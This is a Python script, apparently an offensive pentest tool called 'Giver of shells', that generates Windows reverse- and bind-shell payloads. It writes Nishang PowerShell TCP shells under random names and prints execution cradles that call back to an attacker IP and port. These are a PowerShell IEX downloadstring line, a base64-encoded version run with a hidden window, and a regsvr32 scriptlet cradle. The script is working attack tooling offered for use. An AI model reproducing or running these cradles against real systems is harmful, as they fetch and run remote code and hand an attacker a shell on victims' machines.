#!python3

import argparse, base64, os, random, string
# Red - Important information
# Yellow - Notice me, eventually
# Green - Use me, abuse me, try to lose me
from lib import logger

parser = argparse.ArgumentParser(description = "Giver of shells")
parser.add_argument('-i', '--ip-address', help="Attacker IP Address", required=True)
parser.add_argument('-p', '--port', help="Attacker Port")
parser.add_argument('-d', '--directory', help="Directory for generated payloads")
args = parser.parse_args()

if args.ip_address != None:
	ipaddr = args.ip_address

if args.port != None:
	port = args.port
else:
	port = "12345"

if args.directory != None:
	if args.directory.endswith("/"):
		generated_payload_directory = args.directory
	else:
		generated_payload_directory = args.directory + "/"
else:
	generated_payload_directory = "./web_delivery/"

logger.red_fg("The attacker server is set to %s:%s"  % (ipaddr, port))
logger.red_fg("Writing payloads to %s" % generated_payload_directory)
print()

resource_directory = './resources/'
cradle_commands_file = generated_payload_directory+'cradle_commands.txt'
shell_dictionary = {}
cradle_dictionary = {}

def randomString(length=6):
	return ''.join(random.choice(string.ascii_lowercase) for i in range(length))

def add_cradle_call_command(cradle_method,execution_cradle_command): # cradle_method is the name of the method used for the execution, its only used in the 'cradle_commands.txt' file as a label.
	# execution is the full command copied into the windows prompt
	open(cradle_commands_file, 'w').close()
	with open(cradle_commands_file,'a') as filecontents:
		filecontents.write('%s:\n' % cradle_method)
		filecontents.write(execution_cradle_command+'\n')
		filecontents.write('\n')

def print_shell_dictionary():
	print("Generated Payloads:")
	for shell_name, location in shell_dictionary.items():
		logger.bullet("%s: %s%s" % (logger.yellow_fg(shell_name), generated_payload_directory,logger.green_fg(location)))
	print()

def print_cradle_dictionary():
	print("Generated Execution Cradles:")
	for shell_name, cradles in cradle_dictionary.items():
			randomized_shell_name = cradles[0]
			execution_cradle_command = cradles[1]
			logger.bullet(logger.green_fg(execution_cradle_command))
	print()

def get_cradle(filename,payload,random_shell_name=randomString()):
	with open(filename,'r') as filecontents:
		resource_data = filecontents.read()
		if 'RANDOMIZED_SHELL_NAME'  in resource_data:
			resource_data = resource_data.replace('RANDOMIZED_SHELL_NAME',random_shell_name)
		if 'RAW_DROPPER_BASE64' in resource_data:
			resource_data = resource_data.replace('RAW_DROPPER_BASE64',payload)
		return resource_data

def set_cradle(filename, filecontents):
	filename = filename
	if not os.path.exists(generated_payload_directory):
		os.mkdir(generated_payload_directory)
	filename = generated_payload_directory + filename
	destination_file = open(filename, "w")
	destination_file.write(filecontents)
	destination_file.close()

def register_cradle(cradle_method,filename,random_sct_filename, shellcontent,execution_cradle_command):
	cradle_dictionary[filename,] = [random_sct_filename,execution_cradle_command]
	set_cradle(random_sct_filename, shellcontent)
	add_cradle_call_command(cradle_method,execution_cradle_command)

# Get a resource
def get_resource(filename):
	resource_data = ""
	with open(filename, "r") as filecontents:
		resource_data = filecontents.read()
		if "TEMPLATEIPADDRESS" in resource_data:
			resource_data = resource_data.replace("TEMPLATEIPADDRESS",ipaddr)
		if "TEMPLATEPORT" in resource_data:
			resource_data = resource_data.replace("TEMPLATEPORT",port)
		if "RAW_DROPPER_BASE64" in resource_data:
			resource_data = resource_data.replace("RAW_DROPPER_BASE64",raw_dropper_base64)
	return resource_data

# Write out a resource
def set_resource(filename, filecontents):
	filename = filename
	if not os.path.exists(generated_payload_directory):
		os.mkdir(generated_payload_directory)
	filename = generated_payload_directory + filename
	destination_file = open(filename, "w")
	destination_file.write(filecontents)
	destination_file.close()

def register_shell(filename, shellcontent):
	random_shellname = 'shell_%s.ps1' % randomString()
	shell_dictionary[filename] = random_shellname
	set_resource(random_shellname, shellcontent)

# The base command to pull files from the attackers machine to the victim machine
def raw_dropper(filename):
	base_payload="IEX (new-object system.net.webclient).downloadstring('http://%s:%s/%s')" % (ipaddr, port, filename)
	return base_payload

def raw_dropper_base64(filename):
	base_payload = raw_dropper(filename)
	base64_base_payload = base64.b64encode(base_payload.encode('utf-16-le')).decode('utf-8')
	return base64_base_payload
	
def show_cradles(shell_name,randomized_shell_name):
	logger.heading(shell_name)
	print("Raw PowerShell Execution Cradle:")
	logger.yellow.fg(raw_dropper(randomized_shell_name))
	print()

	print("Base64/UTF-16LE Encoded PowerShell Execution Cradle:")
	logger.yellow.fg(raw_dropper_base64(randomized_shell_name))
	print()

	print("Full PowerShell Execution Cradle:")
	logger.green.fg("powershell.exe -nop -w hidden -e %s" % raw_dropper_base64(randomized_shell_name))
	print()

# A base shell to pull
def nishang_powershell_reverse():
	shell_name = 'Invoke-PowerShellTcp.ps1'
	shell_file = resource_directory+shell_name
	nishang_shell = get_resource(shell_file) # obtains the actual src code for the shell
	register_shell(shell_name, nishang_shell) # writes out the source code with a randomized name and adds the randomized name to a dict() 
	show_cradles(shell_name,shell_dictionary[shell_name]) # shows the generated cradles, in case they are required for manual purposes. Additionally, this takes an 

def nishang_powershell_bind():
	shell_name = 'Invoke-PowerShellTcpOneLineBind.ps1'
	shell_file = resource_directory+shell_name
	nishang_shell = get_resource(shell_file) # obtains the actual src code for the shell
	register_shell(shell_name, nishang_shell) # writes out the source code with a randomized name and adds the randomized name to a dict() 
	show_cradles(shell_name,shell_dictionary[shell_name]) # shows the generated cradles, in case they are required for manual purposes. Additionally, this takes an 

def regsvr32():
	shell_name = 'Invoke-PowerShellTcp.ps1' # payload i want to execute
	shell_file = resource_directory+shell_name # path to said payload
	regsvr32_template_file = resource_directory+'regsvr32.xml'
	b64_payload = raw_dropper_base64(shell_dictionary[shell_name]) # generates the UTF-16LE powershell IEX payload and encodes it into B64 and stores it
	regsvr_cradle_scriptlet = get_cradle(regsvr32_template_file,b64_payload) # takes in the template cradle and the b64 payload
	random_sct_filename = '%s.sct' % randomString(12)
	execution_cradle_command = 'regsvr32 /s /n /u /i:http://%s:%s/%s scrobj.dll' % (ipaddr,port,random_sct_filename)
	register_cradle('regsvr32',shell_name,random_sct_filename, regsvr_cradle_scriptlet,execution_cradle_command) # filename, shellcontent,execution_cradle. 

def cradles():
	regsvr32()

def shells():
	nishang_powershell_reverse() # create and show 
	nishang_powershell_bind() # create and show 


logger.banner()

logger.heading('Shells')

shells()

print_shell_dictionary()

cradles()

logger.heading('Cradles')

print_cradle_dictionary()

print('All execution cradles can be found in %s!' % logger.green_fg(cradle_commands_file))